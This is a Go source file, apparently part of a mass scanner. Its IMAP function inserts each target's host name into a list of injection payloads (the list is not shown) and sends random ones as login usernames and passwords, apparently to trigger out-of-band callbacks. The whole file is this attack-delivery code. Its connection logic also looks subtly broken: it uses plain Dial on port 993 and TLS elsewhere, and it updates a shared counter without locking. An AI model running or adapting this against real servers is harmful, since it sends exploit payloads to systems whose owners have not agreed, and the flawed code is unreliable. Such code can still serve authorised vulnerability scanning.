package main

import (
	"fmt"
	"math/rand"
	"strings"
	"sync"
	"time"

	"github.com/emersion/go-imap/client"
)

// process a single host on IMAP level
func (p *ProcJob) ProcessHostIMAP(port string, wg *sync.WaitGroup) error {
	var host string
	if len(port) < 1 {
		host = p.Host
		port = strings.Split(p.Host, ":")[1]
	} else {
		host = fmt.Sprintf("%s:%s", p.Host, port)
	}

	defer wg.Done()
	thisTime := time.Now()
	fmt.Printf("\r%d/%02d/%02d %02d:%02d:%02d Total processed: %d  |  Current: %s  |  Protocol: %s",
		thisTime.Year(), thisTime.Month(), thisTime.Day(), thisTime.Hour(),
		thisTime.Minute(), thisTime.Second(), procCount, host, p.Protocol)

	procCount++

	var dynamicPayloads []string
	sanitisedDnsName := strings.ReplaceAll(host, ".", "-")
	sanitisedDnsName = strings.ReplaceAll(sanitisedDnsName, ":", "-")
	sanitisedDnsName = strings.ReplaceAll(sanitisedDnsName, "/", "-")
	for _, payload := range xload {
		dynamicPayloads = append(dynamicPayloads, strings.ReplaceAll(payload, "$DNSNAME$", sanitisedDnsName))
	}

	var c = &client.Client{
		Timeout: 3 * time.Second,
	}
	var err error
	var xc = make(chan bool, 1)
	go func() {
		if port != "993" {
			c, err = client.DialTLS(host, nil)
			if err != nil {
				// log.Println(err.Error())
				return
			}
		} else {
			c, err = client.Dial(host)
			if err != nil {
				// log.Println(err.Error())
				return
			}
		}

		defer c.Logout()

		username := dynamicPayloads[rand.Intn(len(dynamicPayloads))]
		password := dynamicPayloads[rand.Intn(len(dynamicPayloads))]
		// do the login using payloads
		if err := c.Login(username, password); err != nil {
			//log.Println(err.Error())
			return
		}
		xc <- true
	}()

	select {
	case <-xc:
		time.Sleep(time.Duration(delay) * time.Second)
		return nil
	case <-time.After(3 * time.Second):
		return fmt.Errorf("timeout during imap login/dial")
	}
}
